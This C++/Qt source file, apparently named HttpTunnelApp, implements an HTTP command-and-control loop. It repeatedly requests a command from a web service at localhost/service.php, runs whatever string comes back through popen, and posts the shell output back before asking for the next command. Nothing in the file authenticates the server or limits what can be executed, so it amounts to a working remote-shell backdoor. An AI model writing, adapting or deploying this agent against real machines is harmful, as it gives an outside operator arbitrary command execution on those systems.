#include "httptunnelapp.h"
#include <string>
#include <iostream>
#include <unistd.h>

HttpTunnelApp::HttpTunnelApp(QObject *parent) : QObject(parent)
{

}




void HttpTunnelApp::execute()
{
    QThreadPool *pool = new QThreadPool();
    pool->setMaxThreadCount(10);

//    HttpWorker *worker = new HttpWorker(QUrl("https://www.yusufbulbul.com"), get);
    QByteArray json = makeJsonObject("getCommand", "params");

    HttpWorker *worker = new HttpWorker(QUrl("http://localhost/service.php"), post, json);
    worker->autoDelete();

    connect(worker, SIGNAL(readyForContent(QString)), this, SLOT(commandPostResultsCallBack(QString)));

    pool->start(worker);

}



QByteArray HttpTunnelApp::makeJsonObject(const QString &FunctionName, const QString &Params)
{
    QJsonObject obj;

    obj.insert("FunctionName", FunctionName);
    obj.insert("params", Params);

    QJsonDocument doc(obj);

    return doc.toJson();
}



void HttpTunnelApp::commandPostResultsCallBack(QString Result)
{
    QThreadPool *pool = new QThreadPool();
    pool->setMaxThreadCount(10);

    Result = Result.trimmed();
    qDebug() << Result;

    std::string f = Result.toStdString();

    std::string g = commandExec(f.c_str());

    qDebug() << QString::fromStdString(g);

    QByteArray json = makeJsonObject("setConsequence", QString::fromStdString(g)) ;

    HttpWorker *worker = new HttpWorker(QUrl("http://localhost/service.php"), post, json);
    worker->autoDelete();

    connect(worker, SIGNAL(readyForContent(QString)), this, SLOT(consequencePostResultCallback(QString)));

    pool->start(worker);


}

void HttpTunnelApp::consequencePostResultCallback(QString Result)
{
    qDebug() << Result.trimmed();

    execute();
}


std::string HttpTunnelApp::commandExec(const char* Cmd)
{
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(Cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}
